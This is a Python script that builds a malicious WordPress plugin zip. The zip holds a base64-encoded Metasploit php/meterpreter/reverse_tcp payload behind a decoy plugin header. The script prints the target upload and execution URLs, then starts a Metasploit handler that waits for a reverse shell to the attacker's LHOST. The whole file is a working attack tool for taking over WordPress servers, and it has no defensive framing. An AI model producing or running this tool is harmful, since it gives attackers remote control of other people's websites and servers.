#!/usr/bin/env python
# Coded By wetw0rk
# Using Kali GNU/Linux Rolling

import os, random, sys, zipfile, subprocess, requests

try:

	LHOST = 'LHOST=' + str(sys.argv[1])
	LPORT = 'LPORT=' + str(sys.argv[2])
	PAYLOAD = 'php/meterpreter/reverse_tcp'

except IndexError:
	print " _    _"
	print "| |  | |"
	print "| |  | |"
	print "| |/\| |"
	print "\  /\  /"
	print " \/  \/"

	print "Usage: %s [LHOST] [LPORT]" % sys.argv[0]
	print "Description: Creates a malicous zip file to upload to wordpress as a plugin"
	print "via msfvenom. Once plugin is made; starts a handler in msfconsole"
	sys.exit()

def generate_plugin(LHOST, LPORT, PAYLOAD):

	# Our "Plugin" Contents
	print "[+] Generating Plugin Script"
	plugin_script = "<?php\n"
	plugin_script += "/**\n"
	plugin_script += " * Plugin Name: %s\n" % ('GotEm')
	plugin_script += " * Version: %d.%d.%d\n" % (random.randint(1, 10), random.randint(1, 10), random.randint(1, 10))
	plugin_script += " * Author: PwnedSauce\n"
	plugin_script += " * Author URI: http://PwnedSauce.com\n"
	plugin_script += " * License: GPL2\n"
	plugin_script += " */\n"
	plugin_script += "?>\n"
	# Write Plugin Contents To File
	print "[+] Writing Plugin Script To File"
	plugin_file = open('QwertyRocks.php','w')
	plugin_file.write(plugin_script)
	plugin_file.close()
	# Generate Payload
	print "[+] Generating Payload To File"
	create_payload = subprocess.Popen(
		['msfvenom', '-p', PAYLOAD, LHOST, LPORT,
		'-e', 'php/base64', '-f', 'raw'], stdout=subprocess.PIPE).communicate()[0]
	# Write Our Payload To A File
	payload_file = open('wetw0rk_maybe.php', 'w')
	payload_file.write("<?php ")
	payload_file.close()
	payload_file = open('wetw0rk_maybe.php','a')
	payload_file.write(create_payload)
	payload_file.write(" ?>")
	payload_file.close()
	# Create Zip With Payload
	print "[+] Writing Files To Zip"
	make_zip = zipfile.ZipFile('malicous.zip', 'w')
	make_zip.write('wetw0rk_maybe.php')
	make_zip.write('QwertyRocks.php')
	print "[+] Cleaning Up Files"
	os.system("rm QwertyRocks.php wetw0rk_maybe.php")
	# Useful Info
	print "[+] General Execution Location: http://(target)/wp-content/plugins/malicous/"
	print "[+] General Upload Location: http://(target)/wp-admin/plugin-install.php?tab=upload"

def handler(LHOST, LPORT, PAYLOAD):

	print "[+] Launching Handler"
	handler = "use exploit/multi/handler\n"
	handler += "set PAYLOAD %s\n" % PAYLOAD
	handler += "set LHOST %s\n" % LHOST.lstrip('LHOST=')
	handler += "set LPORT %s\n" % LPORT.lstrip('LPORT=')
	handler += "exploit"
	handler_file = open('wordpress.rc', 'w')
	handler_file.write(handler)
	handler_file.close()
	os.system("/etc/init.d/postgresql start")
	os.system("msfconsole -r wordpress.rc")


# Generate Plugin
generate_plugin(LHOST, LPORT, PAYLOAD)
# Handler
handler(LHOST, LPORT, PAYLOAD)

